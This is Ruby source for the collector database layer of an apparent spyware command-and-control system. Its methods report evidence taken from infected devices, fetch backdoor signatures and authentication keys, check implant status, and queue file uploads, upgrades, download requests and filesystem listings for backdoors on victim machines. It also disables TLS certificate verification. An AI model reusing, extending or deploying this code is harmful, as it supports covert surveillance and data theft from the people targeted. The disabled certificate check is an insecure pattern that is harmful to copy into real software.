#
#  DB layer for REST communication
#

# from RCS::Common
require 'rcs-common/trace'

# system
require 'timeout'
require 'thread'
require 'json'

module RCS
module Collector

class DB_rest
  include RCS::Tracer

  # if a method does not reply in X seconds consider db down
  DB_TIMEOUT = 10

  def initialize(host)
    @host, @port = host.split(':')

    # the mutex to avoid race conditions
    @semaphore = Mutex.new

    # the HTTP connection object
    @http = Net::HTTP.new(@host, @port)
    @http.use_ssl = true
    
    # no SSL verify for this connection
    @http.verify_mode = OpenSSL::SSL::VERIFY_NONE

    # CA certificate to check if the server ssl certificate is valid
    @http.ca_file = Config.file('DB_CERT')

    # our client certificate to send to the server
    @http.cert = OpenSSL::X509::Certificate.new(File.read(Config.file('DB_CERT')))

    trace :debug, "Using REST to communicate with #{@host}:#{@port}"
  end

  # generic method invocation
  def rest_call(method, uri, content = nil, headers = {})
    begin
      Timeout::timeout(DB_TIMEOUT) do
        return @semaphore.synchronize do
          # the HTTP headers for the authentication
          full_headers = {'Cookie' => @cookie }
          full_headers.merge! headers if headers.is_a? Hash
          case method
            when 'POST'
              # perform the post
              @http.request_post(uri, content, full_headers)
            when 'GET'
              @http.request_get(uri, full_headers)
            when 'DELETE'
              @http.delete(uri, full_headers)
          end
        end
      end
    rescue
      # ensure the mutex is unlocked on timeout or errors
      @semaphore.unlock if @semaphore.locked?
      # propagate the exception to the upper layer
      raise
    end
  end

  # timeout exception propagator
  def propagate_error(e)
    # the db is down we have to report it to the upper layer
    # it means that we are not able to talk to the db
    trace :warn, "The DB in not responding: #{e.class} #{e.message}"
    raise
  end


  # log in to the database
  # returns a boolean
  def login(user, pass)
    begin
      # send the authentication data
      account = {:user => user, :pass => pass}
      resp = @http.request_post('/auth/login', account.to_json, nil)
      # remember the session cookie
      @cookie = resp['Set-Cookie'] unless resp['Set-Cookie'].nil?
      # check that the response is valid JSON
      return JSON.parse(resp.body)['cookie'] == @cookie
    rescue Exception => e
      trace :error, "Error logging in: #{e.class} #{e.message}"
      return false
    end
  end

  def logout
    begin
      rest_call('POST', '/auth/logout', nil)
      return true
    rescue Exception => e
      trace :error, "Error logging out: #{e.class} #{e.message}"
      return false
    end
  end

  def sync_start(session, version, user, device, source, time)
    begin
      content = {:bid => session[:bid],
                 :build => session[:build],
                 :instance => session[:instance],
                 :subtype => session[:subtype],
                 :version => version,
                 :user => user,
                 :device => device,
                 :source => source,
                 :sync_time => time}
      
      rest_call('POST', '/evidence/start', content.to_json)
    rescue
    end
  end

  def sync_timeout(session)
    begin
      content = {:bid => session[:bid], :instance => session[:instance]}
      return rest_call('POST', '/evidence/timeout', content.to_json)
    rescue Exception => e
      trace :error, "Error calling sync_timeout: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def sync_end(session)
    begin
      content = {:bid => session[:bid], :instance => session[:instance]}
      return rest_call('POST', '/evidence/stop', content.to_json)
    rescue Exception => e
      trace :error, "Error calling sync_end: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def send_evidence(instance, evidence)
    begin
      ret = rest_call('POST', "/evidence/#{instance}", evidence)
      
      if ret.kind_of? Net::HTTPSuccess then
        return true
      end

      return false, ret.body
    rescue Exception => e
      trace :error, "Error calling send_evidence: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def status_update(component, remoteip, status, message, disk, cpu, pcpu)
    begin
      content = {:component => component, :ip => remoteip, :status => status, :message => message, :disk => disk, :cpu => cpu, :pcpu => pcpu}
      return rest_call('POST', '/status', content.to_json)
    rescue Exception => e
      trace :error, "Error calling status_update: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def backdoor_signature
    begin
      ret = rest_call('GET', '/signature/backdoor')
      sign = JSON.parse(ret.body)['sign']
      return sign
    rescue Exception => e
      trace :error, "Error calling backdoor_signature: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def network_signature
    begin
      ret = rest_call('GET', '/signature/network')
      sign = JSON.parse(ret.body)['sign']
      return sign
    rescue Exception => e
      trace :error, "Error calling network_signature: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  # used to authenticate the backdoors
  def class_keys(build = '')
    begin
      if build != '' then
        ret = rest_call('GET', "/backdoor/class_keys/#{build}")
      else
        ret = rest_call('GET', '/backdoor/class_keys')
      end
      return JSON.parse(ret.body)
    rescue Exception => e
      trace :error, "Error calling class_keys: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  # backdoor identify
  def backdoor_status(build_id, instance_id, subtype)
    begin
      request = {:build_id => build_id, :instance_id => instance_id, :subtype => subtype}
      ret = rest_call('GET', '/backdoor/status/' + request.to_json)

      status = JSON.parse(ret.body)

      return DB::NO_SUCH_BACKDOOR, 0 if status.empty?

      bid = status['backdoor_id']
      if status['deleted'] == 1 then
        return DB::DELETED_BACKDOOR, bid
      end
      case status['status']
        when 'OPEN'
          return DB::ACTIVE_BACKDOOR, bid
        when 'QUEUED'
          return DB::QUEUED_BACKDOOR, bid
        when 'CLOSED'
          return DB::CLOSED_BACKDOOR, bid
      end
    rescue Exception => e
      trace :error, "Error calling backdoor_status: #{e.class} #{e.message}"
      return DB::UNKNOWN_BACKDOOR, 0
    end
  end



  def new_uploads(bid)
    begin
      ret = rest_call('GET', "/backdoor/uploads/#{bid}")

      upl = {}
      # parse the results and get the contents of the uploads
      JSON.parse(ret.body).each do |elem|
        request = {:backdoor_id => bid, :upload_id => elem['upload_id']}
        upl[elem['upload_id']] = {:filename => elem['filename'],
                                  :content => rest_call('GET', "/backdoor/upload/#{request.to_json}").body }
        trace :debug, "File retrieved: [#{elem['filename']}] #{upl[elem['upload_id']][:content].length} bytes"
      end

      return upl 
    rescue Exception => e
      trace :error, "Error calling new_uploads: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def del_upload(bid, id)
    begin
      request = {:backdoor_id => bid, :upload_id => id}
      return rest_call('DELETE', "/backdoor/upload/#{request.to_json}")
    rescue Exception => e
      trace :error, "Error calling del_upload: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def new_upgrades(bid)
    begin
      ret = rest_call('GET', "/backdoor/upgrades/#{bid}")

      upgr = {}
      # parse the results and get the contents of the uploads
      JSON.parse(ret.body).each do |elem|
        request = {:backdoor_id => bid, :upgrade_id => elem['upgrade_id']}
        upgr[elem['upgrade_id']] = {:filename => elem['filename'],
                                    :content => rest_call('GET', "/backdoor/upgrade/#{request.to_json}").body }
        trace :debug, "File retrieved: [#{elem['filename']}] #{upgr[elem['upgrade_id']][:content].length} bytes"
      end

      return upgr
    rescue Exception => e
      trace :error, "Error calling new_upgrades: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def del_upgrade(bid)
    begin
      request = {:backdoor_id => bid}
      return rest_call('DELETE', "/backdoor/upgrade/#{request.to_json}")
    rescue Exception => e
      trace :error, "Error calling del_upgrade: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  # retrieve the download list from db (if any)
  def new_downloads(bid)
    begin
      ret = rest_call('GET', "/backdoor/downloads/#{bid}")

      down = {}
      # parse the results
      JSON.parse(ret.body).each do |elem|
        down[elem['download_id']] = elem['filename']
      end
      
      return down
    rescue Exception => e
      trace :error, "Error calling new_downloads: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def del_download(bid, id)
    begin
      request = {:backdoor_id => bid, :download_id => id}
      return rest_call('DELETE', "/backdoor/download/#{request.to_json}")
    rescue Exception => e
      trace :error, "Error calling del_download: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  # retrieve the filesystem list from db (if any)
  def new_filesystems(bid)
    begin
      ret = rest_call('GET', "/backdoor/filesystems/#{bid}")

      files = {}
      # parse the results
      JSON.parse(ret.body).each do |elem|
        files[elem['filesystem_id']] = {:depth => elem['depth'], :path => elem['path']}
      end
      
      return files
    rescue Exception => e
      trace :error, "Error calling new_filesystems: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def del_filesystem(bid, id)
    begin
      request = {:backdoor_id => bid, :filesystem_id => id}
      return rest_call('DELETE', "/backdoor/filesystem/#{request.to_json}")
    rescue Exception => e
      trace :error, "Error calling del_filesystem: #{e.class} #{e.message}"
      propagate_error e
    end
  end

end #

end #Collector::
end #RCS::